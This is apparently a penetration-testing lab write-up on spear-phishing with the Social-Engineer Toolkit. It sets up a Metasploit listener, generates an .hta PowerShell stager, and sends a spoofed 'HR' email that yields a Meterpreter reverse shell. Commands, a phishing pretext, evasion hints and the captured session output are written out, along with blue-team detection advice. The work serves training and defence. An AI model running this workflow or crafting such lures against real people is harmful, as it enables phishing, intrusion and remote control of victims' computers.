> **English** | [Italiano](README.md)

# SET Spear-Phishing Attack Vectors: Email with .hta Payload

> - **Phase:** Social Engineering - Spear-Phishing Attack Vectors - Payload Delivery via Email
> - **Visibility:** High - the email transits through the mail gateway (potential detection); opening the .hta file triggers Windows Defender/EDR; the reverse shell connection generates anomalous outbound traffic
> - **Prerequisites:** SET installed on Kali Linux; SMTP relay configured (or direct access to port 25 of the target mail server); victim's email address (obtained via OSINT); Metasploit for the reverse shell listener
> - **Output:** Finding SE-004 (severity High); email delivered with .hta attachment; Meterpreter reverse shell obtained after victim opens the attachment

- **Operating Environment:** Kali Linux (Attacker 192.168.0.110), Windows 10 VM (Victim 192.168.0.120)
- **Target:** Corporate user with email client (Thunderbird)
- **Framework:** Social-Engineer Toolkit (SET) + Metasploit Framework
- **Documented Technique:** Spear-Phishing Attack Vectors - Mass Email Attack with .hta payload

---

## Executive Summary

Spear-phishing with an attached payload is the most documented Initial Access vector in threat intelligence reports (Mandiant M-Trends, CrowdStrike Global Threat Report). Unlike generic phishing, spear-phishing targets a specific individual with a credible pretext built from OSINT information.

SET automates the entire flow: payload generation (in this case an .hta file with PowerShell stager), email composition with attachment, and SMTP delivery. In the lab, an email with a credible corporate pretext was generated, attaching an .hta file that, once opened by the victim, established a Meterpreter reverse shell to the attacker.

The .hta (HTML Application) format was chosen as the vector for its ability to execute arbitrary code leveraging the mshta.exe engine native to Windows, without requiring additional runtime installation. Although modern gateways filter .hta files, the technique remains fundamentally important for understanding the principle of payload delivery via email.

---

## Finding SE-004: Spear-Phishing with .hta Payload and Reverse Shell

**Finding ID:** `SE-004` | **Severity:** `High` | **CVSS:** 8.1

An attacker can send a targeted email with an .hta attachment that, once opened, executes a PowerShell stager to establish a reverse shell. The technique combines social engineering (credible pretext) with execution (mshta.exe) to obtain remote access to the victim's system.

**PoC Scenario:** The analyst sends an email to the target user with an .hta file attached, disguised as a corporate document. Opening the attachment establishes a Meterpreter reverse shell to the attacker machine.

### PoC - Phase 1: Metasploit Listener Setup

Before sending the email, the listener is configured on the attacker machine to receive the reverse shell.

```Bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.110
set LPORT 4444
exploit -j
```

```
[*] Payload handler running as background job 0.
[*] Started reverse TCP handler on 192.168.0.110:4444               <--
```

### PoC - Phase 2: SET Configuration for Spear-Phishing

SET is launched and configured to generate the payload, compose the email, and send it via SMTP.

```Bash
sudo setoolkit
```

```
set> 1    # Social-Engineering Attacks

   1) Spear-Phishing Attack Vectors                   <--
   2) Website Attack Vectors
   3) Infectious Media Generator
   ...

set> 1
```

```
   1) Perform a Mass Email Attack                     <--
   2) Create a FileFormat Payload
   3) Create a Social-Engineering Template

set:phishing> 1
```

SET presents the list of available payloads. For this lab, an HTA payload with PowerShell stager was selected.

```
 Select the file format exploit you want.

   1) Adobe Flash Player "Button" Remote Code Execution
   2) ...
  14) HTA Attack (Generate HTA payload)               <--
   ...

set:phishing> 14
```

```
[*] Generating HTA payload...
[-] LHOST for reverse connection: 192.168.0.110                      <--
[-] LPORT for reverse connection: 4444                               <--
[*] Payload creation complete.
[*] File stored at /root/.set/report.hta                             <--
```

### PoC - Phase 3: Email Composition and Sending

SET requests details for email composition.

```
   1) Use a GMAIL Account for your email attack.
   2) Use your own Email Server or Open Relay.         <--

set:phishing> 2

[-] From address (ex: john@company.com): hr-noreply@company-lab.local   <--
[-] From name: HR Department - Company Lab
[-] Username for SMTP: (leave blank for open relay)
[-] SMTP server: 192.168.0.130
[-] Port: 25
[-] To address: m.rossi@company-lab.local                                <--
[-] Subject: [Urgent] Corporate Policy Update - Action Required          <--
[-] HTML or Plain (h/p): h
[-] First line of body: Please open the attached document to
    confirm acknowledgment of the new corporate policy.
[-] Next line (or END to finish): END

[*] SET has finished sending the emails.                                  <--
```

### PoC - Phase 4: Victim Opens Attachment and Reverse Shell Callback

On the Windows VM, the user receives the email and opens the attachment `report.hta`. Windows executes the file via `mshta.exe`, which launches the PowerShell stager encoded in the HTA file. The stager downloads and executes the second stage (Meterpreter) in memory, establishing the reverse connection.

```
[*] Sending stage (176198 bytes) to 192.168.0.120                   <--
[*] Meterpreter session 1 opened (192.168.0.110:4444 ->
    192.168.0.120:49732) at 2026-03-28 14:23:51 +0200               <--

meterpreter > getuid
Server username: DESKTOP-LAB\m.rossi                                 <--

meterpreter > sysinfo
Computer        : DESKTOP-LAB
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x86/windows
```

The reverse shell is active with `m.rossi` user privileges. From this point the attacker can proceed with post-exploitation (privilege escalation, lateral movement, persistence).

---

## Impact and Remediation (Blue Team)

Executing a payload via spear-phishing email provides the attacker with an interactive shell on the victim's system. The impact depends on the compromised user's privileges, but even a non-privileged account enables data collection, keylogging, and pivoting to other systems.

### Recommended Countermeasures

1. **Email Gateway with Sandboxing:** solutions like Proofpoint, Mimecast, or Microsoft Defender for Office 365 execute attachments in a sandbox before delivery, detecting malicious behavior (outbound connections, file writing, process injection).
2. **Block Dangerous Formats:** block .hta, .vbs, .js, .wsf, .scr attachments and unsigned Office macros at the gateway level. These extensions are rarely needed for legitimate business communications.
3. **Application Whitelisting:** AppLocker or Windows Defender Application Control (WDAC) to block mshta.exe execution by unauthorized users.
4. **Endpoint Detection and Response (EDR):** modern EDRs (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) detect the mshta.exe -> powershell.exe chain with outbound connection.
5. **Security Awareness:** specific spear-phishing training with quarterly practical exercises; teach not to open unexpected attachments, even from internal senders.

---

## Lab Experience

The environment was configured with a test mail server (hMailServer on the Windows VM or MailHog on Kali) to simulate the SMTP relay without depending on external services. The initial setup required attention: SET needs a functioning SMTP relay on port 25, and many ISPs block this port outbound.

The .hta payload generation was automatic: SET internally invoked msfvenom to create the PowerShell stager embedded in the HTML Application. The resulting file (`report.hta`) is an HTML document with a `<script language="VBScript">` tag that executes the payload via `mshta.exe`. Source code analysis revealed that the stager is a Base64 encoded PowerShell one-liner - the same technique documented in `powershell-attack-vectors/`.

Email composition highlighted the importance of the pretext: SET allows customization of sender, subject, and body. In the lab, a credible corporate pretext ("Policy Update - Action Required") was used with the From field set to `hr-noreply@company-lab.local`. In an environment without DMARC/SPF, this email would appear legitimate to the recipient.

The most significant issue encountered was attachment filtering: Windows Defender on the Windows VM detected the .hta file on download. To complete the lab, a temporary exclusion in Defender was necessary. This confirms that the raw .hta technique is now detected by most AV solutions - in a real engagement, the attacker would use evasion techniques (VBScript obfuscation, alternative encoding, or less detected formats like .iso+.lnk).

The Meterpreter reverse shell was successfully established after opening the attachment. The time between double-click and shell was approximately 3 seconds - fast enough not to arouse suspicion in the user, who sees only a window briefly opening and closing.

---

## Theoretical Analysis: Anatomy of a Spear-Phishing Attack

Spear-phishing is distinguished from mass phishing by three fundamental characteristics:

1. **Targeting:** the email is addressed to a specific person, with contextual information gathered via OSINT (name, role, ongoing projects, colleagues).

2. **Pretexting:** the pretext is tailored to the target. An email from "HR" with subject "Corporate Policy" has a much higher open probability than a generic "You won a prize."

3. **Payload customization:** the payload is configured for the target environment (architecture, AV present, execution policies).

From a technical perspective, the .hta file leverages the `mshta.exe` engine (Microsoft HTML Application Host), a legitimate Windows binary classified as a LOLBIN (Living Off the Land Binary). Code execution via LOLBIN is a defense evasion technique because it uses Microsoft-signed executables, making signature-based detection more difficult.

The complete execution chain is: `mshta.exe` -> embedded VBScript -> `powershell.exe -ExecutionPolicy Bypass -EncodedCommand [Base64]` -> in-memory stage 2 download -> Meterpreter. Each step represents a detection opportunity for the defender (process creation events, command line logging, network connections).

In the kill chain, spear-phishing covers three consecutive phases: Weaponization (creating the .hta payload), Delivery (sending the email), and Exploitation (payload execution on the victim). The next phase - Installation/Persistence - requires additional post-exploitation actions documented in module 07.

---

## Real-World Scenario: Targeted Spear-Phishing Campaign

> This section describes how SE-004 would fit into a real engagement against a target organization.

### Attacker Perspective (Red Team)

**Starting point:** OSINT completed; employee email list and corporate org chart obtained; primary target identified (user with access to critical systems); SMTP relay available or look-alike domain configured with valid SPF.

**Projected kill chain:**

```
OSINT: target email + corporate role + colleagues + active projects
        |
        v
Weaponization: .hta payload with PowerShell stager (or modern format: .iso+.lnk)
        |
        v
SE-004: spear-phishing email with contextual pretext + attachment
        |
        v
Victim opens attachment -> mshta.exe -> PowerShell -> reverse shell
        |
        v
Post-Exploitation: enumeration, credential dumping, persistence
        |
        v
Lateral Movement -> Privilege Escalation -> Domain Compromise
```

**Potential impact:** the reverse shell provides interactive access to the victim's system. If the user has elevated privileges or access to sensitive data (file shares, databases, email), the impact is immediate. Even from a non-privileged account, the attacker can execute local privilege escalation (EXPLOIT-013..019) and then move laterally.

### Defender Perspective (Blue Team)

**Detection:** email gateway monitoring for attachments with dangerous extensions; alerts on anomalous process creation chains (mshta.exe spawning powershell.exe); monitoring outbound connections from non-browser processes to uncategorized IPs.

**Indicators of Compromise (IOC):**
- Emails with .hta, .vbs, .js attachments from external senders or look-alike domains
- Process tree: `outlook.exe` -> `mshta.exe` -> `powershell.exe` (Sysmon Event ID 1)
- PowerShell with `-EncodedCommand` and/or `-ExecutionPolicy Bypass` flags (Event ID 4104)
- Outbound TCP connection from workstation to uncategorized IP on non-standard port

**Containment:** immediate workstation isolation from the network; kill the mshta.exe process and child processes; forensic memory acquisition (volatility) before reboot; compromised user credential reset.

**Eradication and hardening:**
- Block mshta.exe and wscript.exe via AppLocker for non-IT users
- Deploy AMSI (Antimalware Scan Interface) for in-memory PowerShell inspection
- Enable Script Block Logging and Module Logging for PowerShell (Event ID 4104)
- Email gateway with detonation chamber (sandbox) for all executable attachments

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Use of SET and msfvenom for .hta payload generation and spear-phishing email composition. |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | Targeted email with .hta attachment sent to target via SMTP relay. |
| Execution | User Execution: Malicious File | `T1204.002` | Victim opens .hta attachment, triggering payload execution via mshta.exe. |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Base64 encoded PowerShell stager downloads and injects second stage (Meterpreter) in memory. |

---

> **Note:** All documented activities were conducted in a virtualized lab environment (VirtualBox, isolated NAT/Bridge network). The email was sent to a local test mail server. No phishing email was sent to real people or organizations.
